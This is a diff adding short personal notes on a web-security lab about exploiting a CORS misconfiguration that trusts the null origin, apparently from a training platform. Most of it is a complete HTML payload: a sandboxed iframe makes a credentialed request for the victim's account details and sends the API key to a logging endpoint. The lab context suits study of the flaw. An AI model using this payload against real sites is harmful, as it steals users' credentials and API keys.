@@ -1,0 +1,33 @@
+   
+                                   2. Lab: CORS vulnerability with trusted null origin
+
+Target :- exploit cors misconfig and get the api key of administrator
+
+Testing cors misconfig :-
+i) change the origin header to arbitary value  => No 
+ii) change the origin header to null value ..
+   => Access-Control-Allow-Origin:null 
+   => Access-Control-Allow-Credentials:true
+hence there is a vulnerability ...
+
+PAYLOAD :---
+<html>
+    <body>
+        <h1>You have been hacked !!!</h1>
+        <iframe  
+         style="display:none" sandbox="allow-scripts" srcdoc=" 
+       <script>
+           var xhr = new XMLHttpRequest();
+           var url = 'https://0a4e00d20325b59d81877ba7007a005e.web-security-academy.net';
+           xhr.onreadystatechange = function(){
+            if(xhr.readyState == XMLHttpRequest.DONE){
+                fetch('/log?key='+xhr.responseText)
+            }
+           }
+           xhr.open('GET',url+'/accountDetails',true)
+           xhr.withCredentials=true;
+           xhr.send(null);
+        </script>
+        ">   </iframe>   
+    </body>
+</html>
